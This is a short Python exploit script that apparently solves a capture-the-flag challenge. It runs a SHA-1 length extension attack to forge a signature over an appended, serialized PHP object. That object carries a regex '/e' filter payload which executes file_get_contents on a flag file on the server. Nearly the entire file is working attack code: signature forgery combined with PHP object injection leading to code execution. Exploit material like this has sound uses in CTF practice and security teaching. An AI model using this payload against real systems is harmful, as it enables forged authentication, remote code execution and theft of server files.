#!/usr/bin/env python
# http://www.vnsecurity.net/t/length-extension-attack/
# sha1 padding/length extension attack
# by rd@vnsecurity.net
#

import sys
import base64
from shaext import shaext
from urllib import quote_plus

keylen = 8
orig_msg = 'b:1;'
orig_sig = '2141b332222df459fd212440824a35e63d37ef69'
add_msg = "\nO:4:\"Post\":3:{s:8:\"\0*\0title\";s:2:\"hi\";s:7:\"\0*\0text\";s:2:\"hi\";s:10:\"\0*\0filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\0*\0pattern\";s:5:\"(.*)e\";s:7:\"\0*\0repl\";s:44:\"file_get_contents('/home/daedalus/flag.txt')\";}}}"

ext = shaext(orig_msg, keylen, orig_sig)
ext.add(add_msg)

(new_msg, new_sig)= ext.final()
		
print "new msg: " + repr(new_msg)
print "base64: " + base64.b64encode(new_msg)
print "new sig: " + new_sig
print "urlencoded: " + quote_plus(new_msg)
